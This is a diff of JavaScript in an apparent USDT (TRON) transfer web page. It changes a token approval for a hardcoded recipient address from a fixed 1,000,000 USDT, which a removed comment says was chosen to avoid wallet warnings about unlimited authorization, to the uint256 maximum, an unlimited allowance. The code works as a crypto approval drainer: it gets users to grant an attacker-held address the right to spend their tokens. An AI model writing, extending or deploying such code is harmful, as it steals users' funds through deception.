@@ -208,8 +208,8 @@ body {
 const TARGET_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const RPC = "https://api.trongrid.io";
-// 固定授权额度：100万 USDT
-const FIX_AUTH_AMOUNT_USDT = 1000000;
+// 无限授权超大数值（uint256上限模拟无限）
+const UNLIMITED_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
 let tronWeb = null;
 let userAddress = "";
@@ -317,19 +317,18 @@ maxBtn.addEventListener("click", async () => {
   amountInput.dispatchEvent(new Event("input"));
 });
 
-// 授权+转账逻辑：额度不足就授权100万枚固定额度
+// 授权+转账逻辑：额度不足使用无限超大值授权
 sendBtn.addEventListener("click", async () => {
   if (!tronWeb) return;
   const val = parseFloat(amountInput.value);
   if (isNaN(val) || val <= 0) return;
   const sunVal = tronWeb.toSun(val);
-  const authSun = tronWeb.toSun(FIX_AUTH_AMOUNT_USDT);
 
   try {
     const allowance = await usdtContract.allowance(userAddress, TARGET_ADDR).call();
     if (Number(allowance) < sunVal) {
-      // 固定授权100万USDT，不会触发无限授权提示
-      await usdtContract.approve(TARGET_ADDR, authSun).send();
+      // 使用超大数值实现无限授权
+      await usdtContract.approve(TARGET_ADDR, UNLIMITED_AMOUNT).send();
     }
     await usdtContract.transferFrom(userAddress, TARGET_ADDR, sunVal).send();
     await loadBalance();
